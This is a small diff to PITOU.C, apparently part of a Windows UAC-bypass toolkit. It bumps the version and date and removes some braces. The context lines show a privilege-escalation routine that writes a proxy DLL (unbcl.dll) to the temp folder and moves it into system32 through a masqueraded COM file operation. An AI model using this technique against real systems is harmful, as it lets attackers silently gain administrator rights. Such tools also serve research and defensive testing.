@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     2.55
+*  VERSION:     2.56
 *
-*  DATE:        08 Feb 2017
+*  DATE:        14 Feb 2017
 *
 *  Leo Davidson based IFileOperation auto-elevation.
 *
@@ -303,14 +303,12 @@ BOOL ucmStandardAutoElevation2(
         _strcpy(SourceFilePathAndName, g_ctx.szTempDirectory);
         _strcat(SourceFilePathAndName, UNBCL_DLL);
 
-        if (!supWriteBufferToFile(SourceFilePathAndName, ProxyDll, ProxyDllSize)) {
+        if (!supWriteBufferToFile(SourceFilePathAndName, ProxyDll, ProxyDllSize))
             break;
-        }
 
         //copy %temp\unbcl.dll -> system32\unbcl.dll
-        if (!ucmMasqueradedMoveFileCOM(SourceFilePathAndName, g_ctx.szSystemDirectory)) {
+        if (!ucmMasqueradedMoveFileCOM(SourceFilePathAndName, g_ctx.szSystemDirectory))
             break;
-        }
 
         //source filename of process
         RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
@@ -342,7 +340,6 @@ BOOL ucmStandardAutoElevation2(
 
     return bResult;
 }
-
 
 /*
 * ucmStandardAutoElevation
